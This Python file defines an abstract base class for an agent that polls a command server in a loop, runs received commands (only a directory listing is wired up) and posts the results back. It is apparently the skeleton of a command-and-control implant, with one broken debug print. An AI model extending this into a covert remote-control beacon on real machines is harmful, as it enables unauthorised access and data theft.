"""
Class to define basic agent functionality
"""

import requests
import uuid
import time
from abc import ABC, abstractmethod
import json


class BaseAgent(ABC):
    """
    Defines basic functionality of an agent
    """

    def __init__(
        self, command_server_ip="127.0.0.1", command_server_port=8000, poll_interval=5
    ) -> None:
        self.id = uuid.uuid4()
        self.poll_interval = poll_interval
        self.timeout = poll_interval
        self.get_url = f"http://{command_server_ip}:{command_server_port}/api/pull"
        self.post_url = f"http://{command_server_ip}:{command_server_port}/api/result"
        self.session = requests.Session()

    def pull_commands(self) -> None:
        data = {"agent_id": str(self.id)}
        try:
            r = self.session.get(
                url=self.get_url, data=json.dumps(data), timeout=self.timeout
            )
            cmds = r.json()
            for cmd in cmds:
                response = self.handle_command(cmd)
                self.send_response(response=response)
        except requests.Timeout:
            print("poll response timed out")
        except requests.ConnectionError:
            print("Can't connect to server")

    def send_response(self, response):
        """
        Send response to CC server.
        """
        print("token: {csrf_token}")
        try:
            requests.post(url=self.post_url, data=response)
        except:
            print("Pushing result failed")

    def create_response(self, output, error, cmd) -> dict:
        """
        Return json serialized response data
        """
        return {"output": output, "error": error, "cmd_id": cmd["pk"]}

    def handle_command(self, cmd) -> dict:
        """
        Process command and return response.
        """
        cmd_type = cmd["fields"]["cmd_type"]
        cmd_args = cmd["fields"]["cmd_args"]
        (output, error) = self.dispatch_command(cmd_type, cmd_args)
        return self.create_response(output, error, cmd)

    @abstractmethod
    def list_directory_contents(self, path):
        """
        Lists contents of dir specified by the 'path' parameter.
        """
        pass

    def dispatch_command(self, type, args) -> tuple:
        if type == "ls":
            return self.list_directory_contents(json.loads(args)[0])
        else:
            return (None, "Command Not Recognized")

    def run(self) -> None:

        while True:
            self.pull_commands()
            time.sleep(self.poll_interval)
